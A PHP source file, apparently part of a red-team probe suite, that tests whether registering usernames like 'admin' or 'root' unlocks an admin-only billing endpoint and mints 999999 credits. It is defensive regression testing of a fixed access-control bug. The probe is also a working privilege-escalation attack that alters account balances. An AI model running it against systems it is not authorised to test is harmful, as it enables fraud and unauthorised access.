<?php

namespace RedTeam\Probes;

use RedTeam\Finding;
use RedTeam\Probe;

/**
 * Regression probe for the "register the magic username, become admin" class of
 * broken access control.
 *
 * The real bug (found + fixed June 2026): `BillingController::addCredits` gated on
 * `$admin->name === 'admin'` instead of the `is_admin` column. The username
 * "admin" was unclaimed, so anyone could register it and mint unlimited credits.
 *
 * This probe tries to claim a privileged-looking username and then exercise an
 * admin-only money endpoint. If the credit grant succeeds (balance rises), the
 * authorization is keyed on something forgeable again — Critical.
 *
 * Destructive: registers an account and (if vulnerable) changes a balance. The
 * account uses an @redteam.local email so the standard cleanup snippet purges it
 * (which also frees the username for the next run). See the README cleanup note.
 */
class AdminImpersonationProbe extends Probe
{
    public function name(): string
    {
        return 'Admin Impersonation / Magic Username';
    }

    public function destructive(): bool
    {
        return true;
    }

    public function run(): array
    {
        $findings = [];
        // Usernames that code sometimes hard-codes as a privilege check.
        foreach (['admin', 'administrator', 'root', 'superadmin'] as $magic) {
            $findings[] = $this->tryName($magic);
        }
        return $findings;
    }

    private function tryName(string $magic): Finding
    {
        $client = new \RedTeam\HttpClient($this->ctx->target);
        $client->primeCsrf('/');

        $email = $this->ctx->marker . '_' . $magic . '_' . bin2hex(random_bytes(3)) . '@redteam.local';
        $pass  = 'Redteam!' . bin2hex(random_bytes(6)) . 'Aa1';

        $reg = $client->postJson('/api/register', [
            'name'                  => $magic,
            'email'                 => $email,
            'password'              => $pass,
            'password_confirmation' => $pass,
        ]);

        if ($reg->status === 422) {
            // Name already taken (real admin / prior run / reserved) — can't claim it.
            return $this->safe(
                "Username '$magic' not claimable",
                "Registration returned 422 — the name is taken/reserved, so a username-keyed gate can't be impersonated.",
                'POST /api/register'
            );
        }
        if (!$reg->ok()) {
            return $this->inconclusive("Could not test '$magic'", "Registration returned HTTP {$reg->status}.", 'POST /api/register');
        }

        // We hold the magic username now. Authenticate and probe the money endpoint.
        $client->postJson('/api/login', ['email' => $email, 'password' => $pass]);
        $me = $client->get('/api/auth-check')->json();
        $uid = is_array($me) ? ($me['user']['id'] ?? null) : null;

        $before = $this->balanceOf($client);
        $grant  = $client->postJson('/api/billing/credits', ['user_id' => $uid, 'amount' => 999999, 'description' => 'redteam-probe']);
        $after  = $this->balanceOf($client);

        if ($grant->ok() && $before !== null && $after !== null && $after > $before) {
            return $this->vuln(
                "Privilege escalation: username '$magic' can mint credits",
                Finding::CRITICAL,
                "Registering the username '$magic' granted access to the admin-only credit endpoint; balance went $before → $after with no real admin rights.",
                'POST /api/billing/credits',
                "username=$magic, balance $before → $after",
                'Authorise admin endpoints via the is_admin column / a role check, never a hard-coded username string.'
            );
        }

        return $this->safe(
            "Username '$magic' grants no admin power",
            "Held the username '$magic' but the credit endpoint returned HTTP {$grant->status} and the balance was unchanged.",
            'POST /api/billing/credits'
        );
    }

    private function balanceOf(\RedTeam\HttpClient $client): ?float
    {
        $json = $client->get('/api/billing/balance')->json();
        if (!is_array($json)) {
            return null;
        }
        foreach (['balance', 'credits', 'available', 'amount'] as $k) {
            if (isset($json[$k]) && is_numeric($json[$k])) {
                return (float) $json[$k];
            }
        }
        return null;
    }
}
